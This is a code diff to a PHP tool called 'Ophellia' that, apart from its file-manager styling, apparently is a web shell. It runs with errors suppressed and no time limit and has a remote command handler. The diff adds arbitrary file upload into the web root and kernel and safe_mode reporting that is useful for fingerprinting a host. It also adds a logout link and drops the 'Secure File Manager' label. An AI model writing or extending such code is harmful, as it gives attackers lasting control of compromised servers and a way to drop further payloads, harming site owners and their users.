@@ -878,6 +878,13 @@ error_reporting(0);
 set_time_limit(0);
 ini_set('memory_limit', '256M');
 
+// Handle logout
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header('Location: ?');
+    exit;
+}
+
 // Handle AJAX delete request
 if (isset($_POST['ajax_delete'])) {
     if (authenticate()) {
@@ -1076,6 +1083,74 @@ if (isset($_POST['ajax_command'])) {
     exit;
 }
 
+// Handle AJAX file upload
+if (isset($_POST['ajax_upload'])) {
+    header('Content-Type: application/json');
+
+    if (!authenticate()) {
+        echo json_encode([
+            'success' => false,
+            'message' => 'Authentication failed'
+        ]);
+        exit;
+    }
+
+    $uploadToRoot = isset($_POST['upload_to_root']) && $_POST['upload_to_root'] === '1';
+    $rootPath = getcwd();
+    $targetDir = $uploadToRoot ? $rootPath : decryptPath($_POST['path'] ?? $rootPath);
+
+    if (!is_dir($targetDir) || !is_writable($targetDir)) {
+        echo json_encode([
+            'success' => false,
+            'message' => 'Target directory is not writable'
+        ]);
+        exit;
+    }
+
+    if (!isset($_FILES['file']) || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {
+        $error = $_FILES['file']['error'] ?? UPLOAD_ERR_NO_FILE;
+        $errorMsg = [
+            UPLOAD_ERR_INI_SIZE => 'File too large (php.ini limit)',
+            UPLOAD_ERR_FORM_SIZE => 'File too large (form limit)',
+            UPLOAD_ERR_PARTIAL => 'Partial upload',
+            UPLOAD_ERR_NO_FILE => 'No file uploaded',
+            UPLOAD_ERR_NO_TMP_DIR => 'No temp folder',
+            UPLOAD_ERR_CANT_WRITE => 'Write failed',
+            UPLOAD_ERR_EXTENSION => 'Upload blocked'
+        ][$error] ?? 'Upload failed';
+
+        echo json_encode([
+            'success' => false,
+            'message' => $errorMsg
+        ]);
+        exit;
+    }
+
+    $filename = basename($_FILES['file']['name']);
+    $targetPath = $targetDir . '/' . $filename;
+
+    // Rename if file exists
+    if (file_exists($targetPath)) {
+        $name = pathinfo($filename, PATHINFO_FILENAME);
+        $ext = pathinfo($filename, PATHINFO_EXTENSION);
+        $filename = $name . '_' . time() . '.' . $ext;
+        $targetPath = $targetDir . '/' . $filename;
+    }
+
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetPath)) {
+        echo json_encode([
+            'success' => true,
+            'message' => 'Uploaded: ' . $filename
+        ]);
+    } else {
+        echo json_encode([
+            'success' => false,
+            'message' => 'Failed to save file'
+        ]);
+    }
+    exit;
+}
+
 // Handle AJAX info request
 if (isset($_POST['ajax_info'])) {
     header('Content-Type: application/json');
@@ -1092,6 +1167,7 @@ if (isset($_POST['ajax_info'])) {
         $info = [];
 
         // PHP Info
+        $safeMode = ini_get('safe_mode');
         $info['php'] = [
             'version' => PHP_VERSION,
             'sapi' => php_sapi_name(),
@@ -1103,6 +1179,7 @@ if (isset($_POST['ajax_info'])) {
             'post_max_size' => ini_get('post_max_size') ?: 'N/A',
             'display_errors' => ini_get('display_errors') ?: '0',
             'error_reporting' => error_reporting(),
+            'safe_mode' => $safeMode && $safeMode !== '' && $safeMode !== '0' ? 'On' : 'Off',
         ];
 
         // Server Info
@@ -1116,11 +1193,16 @@ if (isset($_POST['ajax_info'])) {
         ];
 
         // System Info
+        $uname = @php_uname('a') ?: 'N/A';
+        $kernelParts = explode(' ', $uname);
+        $kernel = isset($kernelParts[2]) ? $kernelParts[2] : ($kernelParts[0] ?? 'N/A');
+
         $info['system'] = [
             'os' => PHP_OS,
             'os_family' => defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY : PHP_OS,
             'hostname' => @gethostname() ?: 'N/A',
-            'uname' => @php_uname() ?: 'N/A',
+            'uname' => $uname,
+            'kernel' => $kernel,
             'current_user' => @get_current_user() ?: 'N/A',
             'current_dir' => @getcwd() ?: 'N/A',
             'temp_dir' => @sys_get_temp_dir() ?: 'N/A',
@@ -1198,8 +1280,9 @@ if (!authenticate()) {
     <body class="flex items-center justify-center min-h-screen">
         <div style="background-color: ' . $loginTheme['surface'] . '; border: 1px solid ' . $loginTheme['border'] . ';" class="p-8 rounded-lg shadow-xl w-96 max-w-md">
             <div class="text-center mb-8">
-                <h1 style="color: ' . $loginTheme['primary'] . ';" class="text-3xl font-bold mb-2">Ophellia ' . VERSION . '</h1>
-                <p style="color: ' . $loginTheme['textVariant'] . ';">Secure File Manager</p>
+                <svg class="h-16 w-16 mx-auto mb-4" style="color: ' . $loginTheme['primary'] . ';" viewBox="0 0 600 530" fill="currentColor">
+                    <path d="m135.72 44.03c66.496 49.921 138.02 151.14 164.28 205.46 26.262-54.316 97.782-155.54 164.28-205.46 47.98-36.021 125.72-63.892 125.72 24.795 0 17.712-10.155 148.79-16.111 170.07-20.703 73.984-96.144 92.854-163.25 81.433 117.3 19.964 147.14 86.092 82.697 152.22-122.39 125.59-175.91-31.511-189.63-71.766-2.514-7.3797-3.6904-10.832-3.7077-7.8964-0.0174-2.9357-1.1937 0.51669-3.7077 7.8964-13.714 40.255-67.233 197.36-189.63 71.766-64.444-66.128-34.605-132.26 82.697-152.22-67.108 11.421-142.55-7.4491-163.25-81.433-5.9562-21.282-16.111-152.36-16.111-170.07 0-88.687 77.742-60.816 125.72-24.795z"/>
+                </svg>
             </div>
 
             <form method="post" action="">
@@ -1221,10 +1304,6 @@ if (!authenticate()) {
                     Login
                 </button>
             </form>
-
-            <div class="mt-6 text-center text-sm" style="color: ' . $loginTheme['textVariant'] . ';">
-                <p>&copy; ' . date('Y') . ' Ophellia File Manager</p>
-            </div>
         </div>
     </body>
     </html>';
@@ -1405,10 +1484,9 @@ $currentTime = date('Y-m-d H:i:s');
             <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
                 <div class="flex items-center">
                     <div class="p-2 bg-surface-container-highest rounded-xl mr-3">
-                        <svg class="h-6 w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                                d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z">
-                            </path>
+                        <svg class="h-6 w-6 text-primary" viewBox="0 0 600 530" fill="currentColor">
+                            <path
+                                d="m135.72 44.03c66.496 49.921 138.02 151.14 164.28 205.46 26.262-54.316 97.782-155.54 164.28-205.46 47.98-36.021 125.72-63.892 125.72 24.795 0 17.712-10.155 148.79-16.111 170.07-20.703 73.984-96.144 92.854-163.25 81.433 117.3 19.964 147.14 86.092 82.697 152.22-122.39 125.59-175.91-31.511-189.63-71.766-2.514-7.3797-3.6904-10.832-3.7077-7.8964-0.0174-2.9357-1.1937 0.51669-3.7077 7.8964-13.714 40.255-67.233 197.36-189.63 71.766-64.444-66.128-34.605-132.26 82.697-152.22-67.108 11.421-142.55-7.4491-163.25-81.433-5.9562-21.282-16.111-152.36-16.111-170.07 0-88.687 77.742-60.816 125.72-24.795z" />
                         </svg>
                     </div>
                     <div>
@@ -1429,17 +1507,15 @@ $currentTime = date('Y-m-d H:i:s');
                         </svg>
                         Home
                     </a>
-                    <div class="hidden sm:flex items-center gap-3 text-on-surface-variant">
-                        <div class="flex items-center">
-                            <svg class="h-4 w-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                                    d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
-                            </svg>
-                            <span>
-                                <?= htmlspecialchars($currentUser) ?>
-                            </span>
-                        </div>
-                    </div>
+                    <a href="?logout=1"
+                        class="flex items-center px-3 py-1.5 bg-error-container text-on-error-container rounded-lg hover:bg-error-container-hover transition-colors text-sm font-medium">
+                        <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1">
+                            </path>
+                        </svg>
+                        Logout
+                    </a>
                 </div>
             </div>
         </div>
@@ -1497,6 +1573,16 @@ $currentTime = date('Y-m-d H:i:s');
                         <span class="hidden sm:inline">Command</span>
                         <span class="sm:hidden">Cmd</span>
                     </button>
+                    <button onclick="showUploadModal('<?= encryptPath($currentDir) ?>')"
+                        class="flex items-center px-3 py-2 bg-primary text-on-primary rounded-xl hover:opacity-90 transition-all shadow-sm hover:shadow-md text-sm font-medium">
+                        <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12">
+                            </path>
+                        </svg>
+                        <span class="hidden sm:inline">Upload</span>
+                        <span class="sm:hidden">Up</span>
+                    </button>
                     <button onclick="showInfoModal()"
                         class="flex items-center px-3 py-2 bg-primary text-on-primary rounded-xl hover:opacity-90 transition-all shadow-sm hover:shadow-md text-sm font-medium">
                         <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -1545,9 +1631,7 @@ $currentTime = date('Y-m-d H:i:s');
                         <a href="https://rei.my.id" class="hover:text-primary transition-colors">@elliottophellia</a>
                     </span>
                     <span class="hidden sm:inline text-outline">&bull;</span>
-                    <span class="text-xs text-on-surface-variant">v
-                        <?= VERSION ?>
-                    </span>
+                    <span class="text-xs text-on-surface-variant">v<?= VERSION ?></span>
                 </div>
                 <div class="flex items-center gap-4 text-sm">
                     <a href="https://t.me/elliottophellia"
